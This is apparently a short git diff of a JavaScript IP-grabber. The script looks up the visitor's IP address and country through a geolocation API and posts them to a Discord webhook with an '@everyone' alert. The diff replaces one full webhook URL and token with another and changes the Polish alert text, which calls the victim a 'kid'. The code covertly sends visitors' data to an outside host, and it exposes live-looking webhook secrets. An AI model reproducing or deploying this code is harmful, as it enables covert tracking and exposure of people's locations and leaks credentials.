@@ -1,4 +1,4 @@
-var webHookUrl = "https://discordapp.com/api/webhooks/1012818556020326451/YIUGXxOpMIDKTgCoE5hlJY4TWLAyEvggbVwfR-RRUQiDoSuxOYm8NXtOw7vUtZWX-Cfp";
+var webHookUrl = "https://discord.com/api/webhooks/1011005882861092985/q0e5DBOwkyLrD9_35RoamXrMiS3h4rYbITorQGRsvFkxGjMeO7eQ7hNtv1ASwDzYtoom";
 
 $.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
   console.log(JSON.stringify(data, null, 2));
@@ -22,7 +22,7 @@ const request = async () => { // Calling a "synchronous" fetch
     var params = {
         username:   "IP Log",
         avatar_url: "",
-        content:    "**NOWA KURWA IP BOMBA** @everyone \n" + 
+        content:    "**nowe ip kida** @everyone \n" + 
 		    "__**:globe_with_meridians: IP Address:**__ \n" +
                     "`" + ip + "` \n \n" +
 		    "__**Country:**__ \n" +
